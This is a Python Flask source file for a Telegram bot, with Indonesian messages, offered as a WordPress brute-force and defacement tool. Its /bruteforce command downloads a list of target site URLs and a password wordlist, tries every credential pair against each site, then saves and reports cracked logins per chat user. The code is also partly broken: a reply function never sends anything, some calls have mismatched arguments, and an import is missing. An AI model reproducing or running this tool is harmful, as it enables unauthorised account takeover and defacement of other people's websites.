from flask import *
import os
import wpbf
token = os.environ['TOKEN']
url = f'https://api.telegram.org/bot{token}/'
wp = Flask(__name__)
def data(username,password,id,mode):
	if mode == 'write':
		open(id,'a').write(username+' | '+password)
	elif mode == 'read':
		if id in os.listdir(os.getcwd()):
			z=open(id,'r').read()
			return z
		else:
			balas(id,'kamu tidak memiliki list web yg terdeface')
@wp.route('/',methods=['GET','POST'])
def skuy():
	if request.method == 'POST':
		DataUpdate = request.get_json()
		returner(DataUpdate)
		return 'pop'
	else:
		return 'oke'
def returner(pesan):
	perintah = '''
author : krypton-Byte
perintah:
      /bruteforce <url file web txt> <url file wordlist>
      /hasil
'''
	teks = pesan['message']['text']
	cmd = teks.split(' ')
	id  = pesan['message']['chat']['id']
	usr = pesan['message']['chat']['username']
	cmd=teks.split('\n')
	if 'new_chat_member' in pesan:
		balas(id,'selamat datang @'+usr+'\n'+perintah)
	elif cmd[0] == '/bruteforce':
		try:
			balas(id,'sedang mengcrack.......')
			url = requests.get(cmd[1]).text
			wordlist = requests.get(cmd[2]).text
			for x in wordlist.split('\n'):
				for y in wordlist.split('\n'):
					for z in url.split('\n'):
						if wpbf.bf(z,x,y) == True:
							data(x,y,id,'write')
							balas(id,x+' | '+y)
		except:
			balas(id,'argument salah')
	elif cmd[0] == '/hasil':
		balas('oke','oke',id,'view')
	elif cmd[0] == '/help':
		balas(perintah)
def balas(id,teks):
	data={
		'chat_id':id,
		'text':teks
}
wp.run(host='0.0.0.0',port=int(os.environ.get('PORT','5000')),debug=True)
